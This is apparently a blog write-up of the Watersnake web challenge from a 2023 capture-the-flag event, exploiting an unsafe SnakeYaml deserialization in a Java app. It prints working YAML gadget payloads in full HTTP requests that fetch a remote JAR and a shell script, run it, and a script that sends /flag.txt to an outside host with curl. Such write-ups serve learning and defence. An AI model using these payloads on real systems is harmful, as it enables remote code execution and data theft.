---
layout: post
title: HTB Business CTF 2023 Writeup - Web - Watersnake
date: 2023-07-19
type: post
tags:
- Writeup
- Hacking
- BusinessCTF
- CTF
permalink: /2023/07/HTBBusinessCTF/WebWatersnake
img: 2023/07/HTBBusinessCTF/Watersnake/WatersnakeDescription.png
---

In this challenge I had to exploit a Java deserialization vulnerability in [SnakeYaml](https://github.com/snakeyaml/snakeyaml).

> Easy

> As the United Nations of Zenium and the Board of Arodor engage in a fierce competition to establish a colony on Mars using Vitalium. State hackers from UNZ identify an exposed instance of the critical facility water management software, Watersnakev3, in one of Arodor's main water treatment plants. The objective is to gain control over the water supply, and weaken the Arodor's infrastructure.

The challenge provided a web link and the source code of the application.

![Dashboard](/assets/images/2023/07/HTBBusinessCTF/Watersnake/Dashboard.png "Dashboard")

I looked around the application, there was a page that allowed updating the application framework.

![Update Framework](/assets/images/2023/07/HTBBusinessCTF/Watersnake/Update.png "Update Framework")

I looked at the code for that page.

```java
import org.yaml.snakeyaml.Yaml;

...

@PostMapping("/update")
public String update(@RequestParam(name = "config") String updateConfig) {
      InputStream is = new ByteArrayInputStream(updateConfig.getBytes());
    
      Yaml yaml = new Yaml();

    Map<String, Object> obj = yaml.load(is);

  obj.forEach((key, value) -> System.out.println(key + ":" + value));

  return "Config queued for firmware update";
}
```

The code was not doing much. It parsed the posted data with SnakeYaml and printed the information on the server. It didn't use the data for anything else.

I looked for SnakeYaml and found a [deserialization vulnerability](https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/). I tried the provided example.

```http
POST /update HTTP/1.1
Host: 94.237.59.27:41305
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://94.237.59.27:41305/update.html
Content-Type: multipart/form-data; boundary=---------------------------35757842852628603361634950895
Origin: http://94.237.59.27:41305
Connection: keep-alive
Content-Length: 323

-----------------------------35757842852628603361634950895
Content-Disposition: form-data; name="config"

a: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://03aa-69-159-156-59.ngrok-free.app/test.jar"]]]]
b: fdsklj
-----------------------------35757842852628603361634950895--
```

My web server got a hit.

```
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
127.0.0.1 - - [14/Jul/2023 18:55:52] "GET /test.jar HTTP/1.1" 200 -
```

With that, I knew I could execute code on the server. I created a small script to read the flag and send it to my server.

```bash
$ cat test.sh
#!/bin/bash

TEST=`cat /flag.txt | base64`
curl https://b53d-69-159-156-59.ngrok-free.app/$TEST
```

Then I used the vulnerability to download the file from the server.

```http
POST /update HTTP/1.1
Host: 94.237.59.27:41305
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://94.237.59.27:41305/update.html
Content-Type: multipart/form-data; boundary=---------------------------35757842852628603361634950895
Origin: http://94.237.59.27:41305
Connection: keep-alive
Content-Length: 296

-----------------------------35757842852628603361634950895
Content-Disposition: form-data; name="config"

a: !!com.lean.watersnake.GetWaterLevel ["curl https://b53d-69-159-156-59.ngrok-free.app/test.sh -o /tmp/test.sh"]
b: fdsklj
-----------------------------35757842852628603361634950895--

```

And finally execute it.

```http
POST /update HTTP/1.1
Host: 94.237.59.27:41305
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://94.237.59.27:41305/update.html
Content-Type: multipart/form-data; boundary=---------------------------35757842852628603361634950895
Origin: http://94.237.59.27:41305
Connection: keep-alive
Content-Length: 243

-----------------------------35757842852628603361634950895
Content-Disposition: form-data; name="config"

a: !!com.lean.watersnake.GetWaterLevel ["bash /tmp/test.sh"]
b: fdsklj
-----------------------------35757842852628603361634950895--
```

My server got the file download, and the base64 encoded flag.

```bash
127.0.0.1 - - [14/Jul/2023 19:02:18] "GET /test.sh HTTP/1.1" 200 -
127.0.0.1 - - [14/Jul/2023 19:02:23] code 404, message File not found
127.0.0.1 - - [14/Jul/2023 19:02:24] "GET /SFRCe3IxZDNfdGgzX3NuNGszfQ== HTTP/1.1" 404 -
```

I decoded the flag and submitted it.

```bash
$ echo -n SFRCe3IxZDNfdGgzX3NuNGszfQ== | base64 -d
HTB{r1d3_th3_sn4k3}
```